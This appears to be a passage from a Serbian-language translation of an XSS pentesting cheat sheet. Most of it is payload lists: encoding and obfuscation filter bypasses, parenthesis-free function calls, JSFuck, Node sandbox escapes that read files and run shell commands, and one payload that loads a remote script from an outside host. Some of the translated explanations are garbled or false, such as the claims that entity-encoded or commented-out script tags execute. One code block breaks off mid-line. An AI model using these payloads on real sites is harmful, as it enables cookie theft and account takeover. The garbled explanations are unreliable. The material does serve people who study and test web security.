Na primer, ako se susretnete sa XSS ranjivošću koja filtrira znakove `<` i `>`, možete pokušati enkodirati kod koristeći HTML enkodiranje. Na taj način, umesto da koristite `<script>alert('XSS')</script>`, možete koristiti `&lt;script&gt;alert('XSS')&lt;/script&gt;`. Kada se ovo prikaže na stranici, pregledač će dekodirati HTML entitete i izvršiti kod.

Važno je napomenuti da ova tehnika može biti manje pouzdana i može biti otežana dodatnim sigurnosnim mehanizmima kao što su WAF (Web Application Firewall). Takođe, treba biti oprezan prilikom izvršavanja enkodiranog koda, jer može dovesti do ozbiljnih posledica kao što su krađa kolačića ili preuzimanje kontrolu nad korisničkim računima.
```markup
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</iframe>">
```
### Unicode kodiranje izvršavanja JS koda

Ova tehnika se koristi za izvršavanje JavaScript koda putem XSS napada. Koristi se Unicode kodiranje kako bi se izbjeglo otkrivanje i blokiranje štetnog koda.

#### Kako radi?

1. Prvo, potrebno je identificirati mjesto na web stranici gdje se može ubaciti XSS payload.
2. Zatim, JavaScript kod koji želimo izvršiti treba biti pretvoren u Unicode format.
3. Unicode karakteri se zatim ubacuju u XSS payload kako bi se izbjeglo otkrivanje štetnog koda.
4. Kada se payload izvrši na ciljanoj web stranici, Unicode karakteri se dekodiraju i JavaScript kod se izvršava.

#### Primjer

Originalni JavaScript kod koji želimo izvršiti:

```javascript
alert('XSS executed');
```

Unicode kodiranje:

```javascript
\u0061\u006c\u0065\u0072\u0074('\u0058\u0053\u0053\u0020\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0064');
```

Payload koji se ubacuje u XSS napad:

```html
<script>
var payload = '\u0061\u006c\u0065\u0072\u0074('\u0058\u0053\u0053\u0020\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0064')';
eval(payload);
</script>
```

Kada se ovaj payload izvrši na ciljanoj web stranici, JavaScript kod će biti dekodiran i izvršen, prikazujući upozorenje "XSS executed".
```javascript
\u{61}lert(1)
\u0061lert(1)
\u{0061}lert(1)
```
### Tehnike za zaobilaženje crnih lista JavaScript-a

**Niske**
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```
**Posebni escape znakovi**
```javascript
'\b' //backspace
'\f' //form feed
'\n' //new line
'\r' //carriage return
'\t' //tab
'\b' //backspace
'\f' //form feed
'\n' //new line
'\r' //carriage return
'\t' //tab
// Any other char escaped is just itself
```
**Zamene razmaka unutar JS koda**

Kada koristite XSS (Cross-Site Scripting) napad, možete se suočiti sa situacijom u kojoj ne možete koristiti razmake u svom zlonamernom kodu. To može biti zbog različitih razloga, kao što su filteri koji blokiraju razmake ili ograničenja u načinu na koji je kod implementiran.

Međutim, postoje neke tehnike koje možete koristiti kako biste zaobišli ova ograničenja i izvršili XSS napad. Jedna od tih tehnika je zamena razmaka unutar JS koda.

Umesto korišćenja običnog razmaka, možete koristiti druge znakove koji će biti tretirani kao razmak prilikom izvršavanja koda. Na primer, možete koristiti znakove poput `/**/` ili `//`.

Evo primera kako možete koristiti ove zamene razmaka:

```html
<script>
    var payload=alert('XSS attack');
    eval('var'+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**/+/**
```javascript
<TAB>
/**/
```
**JavaScript komentari (iz trika** [**JavaScript komentari**](./#javascript-comments) **)**
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line
```
**JavaScript nove linije (iz trika** [**JavaScript nove linije**](./#javascript-new-lines)**)**
```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10); alert('//\nalert(1)') //0x0a
String.fromCharCode(13); alert('//\ralert(1)') //0x0d
String.fromCharCode(8232); alert('//\u2028alert(1)') //0xe2 0x80 0xa8
String.fromCharCode(8233); alert('//\u2029alert(1)') //0xe2 0x80 0xa9
```
**JavaScript razmaci**

Razmaci u JavaScriptu mogu biti važni prilikom pisanja koda, ali mogu biti i korisni prilikom izvođenja napada poput XSS (Cross-Site Scripting). XSS napadi se često koriste za ubacivanje zlonamjernog JavaScript koda u web stranice kako bi se iskoristile ranjivosti i izvršile neovlaštene radnje.

Razmaci u JavaScriptu mogu biti iskorišćeni za zaobilaženje sigurnosnih mehanizama i izvršavanje zlonamjernog koda. Na primer, ako se razmaci ubace između karaktera u JavaScript kodu, može se izbeći detekcija i blokiranje zlonamjernog koda od strane sigurnosnih mehanizama.

Važno je da prilikom pisanja koda ili analize sigurnosti web stranica obratite pažnju na razmake u JavaScriptu kako biste izbegli potencijalne ranjivosti i zaštitili se od XSS napada.
```javascript
log=[];
function funct(){}
for(let i=0;i<=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```
**Javascript unutar komentara**

Ako je web aplikacija ranjiva na XSS (Cross-Site Scripting) napad, jedan od načina da se ubaci zlonamjerni kod je korišćenjem JavaScripta unutar komentara. Kada se komentar ne filtrira pravilno, zlonamjerni kod može biti izvršen prilikom prikaza komentara na stranici.

Na primer, ako je komentar na web stranici:

```html
<!-- Ovo je komentar -->
```

Napadač može ubaciti zlonamjerni JavaScript kod unutar komentara:

```html
<!-- <script>alert('XSS');</script> -->
```

Kada se komentar prikaže na stranici, JavaScript kod će biti izvršen i prikazaće se upozorenje "XSS".

Ovo je samo jedan od načina da se iskoristi XSS ranjivost. Važno je da web razvojni tim pravilno filtrira i sanitizuje sve korisničke unose kako bi se sprečili ovakvi napadi.
```javascript
//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```
**JavaScript bez zagrada**

Uobičajeno je da se JavaScript kod izvršava pozivanjem funkcija koje su definisane sa zagradama. Međutim, postoji način da se izvrši JavaScript kod bez korišćenja zagrada. Ova tehnika se često koristi u napadima XSS (Cross-Site Scripting) kako bi se izvršio zlonamerni kod na ciljnom veb sajtu.

Kada se JavaScript kod izvršava bez zagrada, koristi se `eval` funkcija koja omogućava izvršavanje proizvoljnog koda. Na primer, umesto da koristimo `alert('Hello, world!');`, možemo koristiti `eval 'alert' 'Hello, world!';`.

Ova tehnika može biti veoma opasna jer omogućava izvršavanje bilo kog JavaScript koda na ciljnom sajtu. Zbog toga je važno da veb programeri preduzmu odgovarajuće mere zaštite kako bi sprečili ovakve napade.
````javascript
// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x```

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.
````
* [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
* [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

**Proizvoljan poziv funkcije (alert)**
````javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
````
## **DOM ranjivosti**

Postoji **JS kod** koji koristi **nesigurne podatke kontrolisane od strane napadača** kao što je `location.href`. Napadač može iskoristiti ovo da izvrši proizvoljan JS kod.\
**Zbog proširenja objašnjenja o** [**DOM ranjivostima, premešteno je na ovu stranicu**](dom-xss.md)**:**

{% content-ref url="dom-xss.md" %}
[dom-xss.md](dom-xss.md)
{% endcontent-ref %}

Tamo ćete pronaći detaljno **objašnjenje o tome šta su DOM ranjivosti, kako se izazivaju i kako ih iskoristiti**.\
Takođe, ne zaboravite da **na kraju pomenutog posta** možete pronaći objašnjenje o [**DOM Clobbering napadima**](dom-xss.md#dom-clobbering).

## Ostali zaobiđeni

### Normalizovani Unicode

Možete proveriti da li su **reflektovane vrednosti** normalizovane u Unicode formatu na serveru (ili na strani klijenta) i iskoristiti ovu funkcionalnost da zaobiđete zaštitu. [**Pronađite primer ovde**](../unicode-injection/#xss-cross-site-scripting).

### PHP FILTER\_VALIDATE\_EMAIL flag zaobilaženje
```javascript
"><svg/onload=confirm(1)>"@x.y
```
### Bypass za Ruby-On-Rails

Zbog **RoR masovnog dodeljivanja** navodnici se ubacuju u HTML, a zatim se zaobilazi ograničenje navodnika i dodaju se dodatna polja (onfocus) unutar oznake.\
Na primer obrasca ([iz ovog izveštaja](https://hackerone.com/reports/709336)), ako pošaljete payload:
```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```
Par "Ključ","Vrednost" će biti vraćen na sledeći način:
```
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
```
### Posebne kombinacije

Some special combinations of characters can be used to bypass certain filters or to execute XSS attacks in specific contexts. Here are some examples:

- `<img src=x onerror=alert(1)>` - This combination can be used to execute an XSS attack in an `<img>` tag by triggering the `onerror` event.
- `<svg onload=alert(1)>` - This combination can be used to execute an XSS attack in an `<svg>` tag by triggering the `onload` event.
- `<a href=javascript:alert(1)>` - This combination can be used to execute an XSS attack in an `<a>` tag by using the `javascript:` protocol.
- `<iframe src=javascript:alert(1)>` - This combination can be used to execute an XSS attack in an `<iframe>` tag by using the `javascript:` protocol.
- `<script>alert(1)</script>` - This combination can be used to execute an XSS attack by directly injecting a `<script>` tag.

These are just a few examples, and there are many other possible combinations that can be used to exploit XSS vulnerabilities. It's important to understand the context in which the payload will be executed in order to craft the appropriate combination.
```markup
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)
```
### XSS sa ubrizgavanjem zaglavlja u 302 odgovoru

Ako otkrijete da možete **ubrizgati zaglavlja u 302 preusmjeravanje odgovora**, možete pokušati **naterati preglednik da izvrši proizvoljni JavaScript**. Ovo nije jednostavno jer moderni preglednici ne tumače tijelo HTTP odgovora ako je statusni kod HTTP odgovora 302, pa je samo XSS opterećenje beskorisno.

U [**ovom izvještaju**](https://www.gremwell.com/firefox-xss-302) i [**ovom**](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/) možete pročitati kako možete testirati nekoliko protokola unutar zaglavlja Lokacija i vidjeti ako bilo koji od njih omogućava pregledniku da pregleda i izvrši XSS opterećenje unutar tijela.\
Poznati protokoli: `mailto://`, `//x:1/`, `ws://`, `wss://`, _prazno zaglavlje Lokacija_, `resource://`.

### Samo slova, brojevi i tačke

Ako možete naznačiti **callback** koji će JavaScript **izvršiti** ograničen na ove znakove. [**Pročitajte ovaj dio ovog posta**](./#javascript-function) da biste saznali kako iskoristiti ovaj ponašanje.

### Validni `<script>` Content-Type-ovi za XSS

(Iz [**ovog izvora**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Ako pokušate učitati skriptu sa **content-type**-om kao što je `application/octet-stream`, Chrome će prikazati sljedeću grešku:

> Refused to execute script from ‘[https://uploader.c.hc.lc/uploads/xxx'](https://uploader.c.hc.lc/uploads/xxx') because its MIME type (‘application/octet-stream’) is not executable, and strict MIME type checking is enabled.

Jedini **Content-Type**-ovi koji će podržati Chrome da pokrene **učitanu skriptu** su oni koji se nalaze unutar konstante **`kSupportedJavascriptTypes`** sa [https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third\_party/blink/common/mime\_util/mime\_util.cc](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third\_party/blink/common/mime\_util/mime\_util.cc)
```c
const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

```
### Vrste skripti za XSS

(Odavde [**ovde**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Dakle, koje vrste mogu biti naznačene za učitavanje skripte?
```html
<script type="???"></script>
```
Odgovor je:

* **module** (podrazumevano, nema šta da se objašnjava)
* [**webbundle**](https://web.dev/web-bundles/): Web Bundles je funkcionalnost koja omogućava pakovanje različitih podataka (HTML, CSS, JS...) u jedan **`.wbn`** fajl.
```html
<script type="webbundle">
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP
```
* [**importmap**](https://github.com/WICG/import-maps)**:** Omogućava poboljšanje sintakse uvoza
```html
<script type="importmap">
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment";
import { partition } from "lodash";
</script>
```
Ovo ponašanje je korišćeno u [**ovom izveštaju**](https://github.com/zwade/yaca/tree/master/solution) za preslikavanje biblioteke na eval kako bi se zloupotrebila i izazvala XSS.

* [**speculationrules**](https://github.com/WICG/nav-speculation)**:** Ova funkcionalnost je uglavnom namenjena rešavanju nekih problema koje izaziva pre-renderovanje. Radi na sledeći način:
```html
<script type="speculationrules">
{
"prerender": [
{"source": "list",
"urls": ["/page/2"],
"score": 0.5},
{"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1}
]
}
</script>
```
### Web Content-Types za XSS

(Sa [**ovde**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Sledeći tipovi sadržaja mogu izvršiti XSS u svim pregledačima:

* text/html
* application/xhtml+xml
* application/xml
* text/xml
* image/svg+xml
* text/plain (?? nije na listi, ali mislim da sam ovo video u CTF-u)
* application/rss+xml (isključeno)
* application/atom+xml (isključeno)

U drugim pregledačima se mogu koristiti i drugi **`Content-Types`** za izvršavanje proizvoljnog JS koda, proverite: [https://github.com/BlackFan/content-type-research/blob/master/XSS.md](https://github.com/BlackFan/content-type-research/blob/master/XSS.md)

### xml Content Type

Ako stranica vraća sadržaj sa content-type text/xml, moguće je naznačiti namespace i izvršiti proizvoljni JS kod:
```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->
```
### Posebni šabloni zamene

Kada se koristi nešto poput **`"neki {{šablon}} podaci".replace("{{šablon}}", <korisnički_unos>)`**, napadač može koristiti [**posebne zamene stringova**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global\_Objects/String/replace#specifying\_a\_string\_as\_the\_replacement) da bi pokušao da zaobiđe određene zaštite: ``"123 {{šablon}} 456".replace("{{šablon}}", JSON.stringify({"ime": "$'$`alert(1)//"}))``

Na primer, u [**ovom objašnjenju**](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA), ovo je korišćeno da se **izvrši JSON string** unutar skripte i izvrši proizvoljni kod.

### Chrome keširanje do XSS-a

{% content-ref url="chrome-cache-to-xss.md" %}
[chrome-cache-to-xss.md](chrome-cache-to-xss.md)
{% endcontent-ref %}

### Bekstvo iz XS zatvora

Ako imate samo ograničen skup karaktera koje možete koristiti, proverite ove druge validne rešenja za probleme sa XS zatvorima:
```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
```
Ako je **sve nedefinisano** pre izvršavanja nepouzdanog koda (kao u [**ovom članku**](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/#miscx2fundefined55-solves)), moguće je generisati korisne objekte "iz ničega" kako bi se zloupotrebilo izvršavanje proizvoljnog nepouzdanog koda:

* Korišćenje import()
```javascript
// although import "fs" doesn’t work, import('fs') does.
import("fs").then(m=>console.log(m.readFileSync("/flag.txt", "utf8")))
```
* Pristupanje `require` indirektno

[Prema ovome](https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050), moduli su omotani u funkciju od strane Node.js, kao što je prikazano:
```javascript
(function (exports, require, module, __filename, __dirname) {
// our actual module code
});
```
Stoga, ako iz tog modula možemo **pozvati drugu funkciju**, moguće je koristiti `arguments.callee.caller.arguments[1]` iz te funkcije kako bismo pristupili **`require`**:

{% code overflow="wrap" %}
```javascript
(function(){return arguments.callee.caller.arguments[1]("fs").readFileSync("/flag.txt", "utf8")})()
```
{% endcode %}

Na sličan način kao i u prethodnom primeru, moguće je **koristiti rukovaoce greškama** da pristupite **omotaču** modula i dobijete funkciju **`require`**:
```javascript
try {
null.f()
} catch (e) {
TypeError = e.constructor
}
Object = {}.constructor
String = ''.constructor
Error = TypeError.prototype.__proto__.constructor
function CustomError() {
const oldStackTrace = Error.prepareStackTrace
try {
Error.prepareStackTrace = (err, structuredStackTrace) => structuredStackTrace
Error.captureStackTrace(this)
this.stack
} finally {
Error.prepareStackTrace = oldStackTrace
}
}
function trigger() {
const err = new CustomError()
console.log(err.stack[0])
for (const x of err.stack) {
// use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameter
const fn = x.getFunction()
console.log(String(fn).slice(0, 200))
console.log(fn?.arguments)
console.log('='.repeat(40))
if ((args = fn?.arguments)?.length > 0) {
req = args[1]
console.log(req('child_process').execSync('id').toString())
}
}
}
trigger()
```
### Obfuskacija i napredno zaobilaženje

* **Različite obfuskacije na jednoj stranici:** [**https://aem1k.com/aurebesh.js/**](https://aem1k.com/aurebesh.js/)
* [https://github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js)
* [https://ooze.ninja/javascript/poisonjs](https://ooze.ninja/javascript/poisonjs)
* [https://javascriptobfuscator.herokuapp.com/](https://javascriptobfuscator.herokuapp.com)
* [https://skalman.github.io/UglifyJS-online/](https://skalman.github.io/UglifyJS-online/)
* [http://www.jsfuck.com/](http://www.jsfuck.com)
* Naprednija JSFuck: [https://medium.com/@Master\_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce](https://medium.com/@Master\_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
* [http://utf-8.jp/public/jjencode.html](http://utf-8.jp/public/jjencode.html)
* [https://utf-8.jp/public/aaencode.html](https://utf-8.jp/public/aaencode.html)
* [https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
```javascript
//Katana
<script>([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()</script>
```

```javascript
//JJencode
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
```

```javascript
//JSFuck
<script>(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]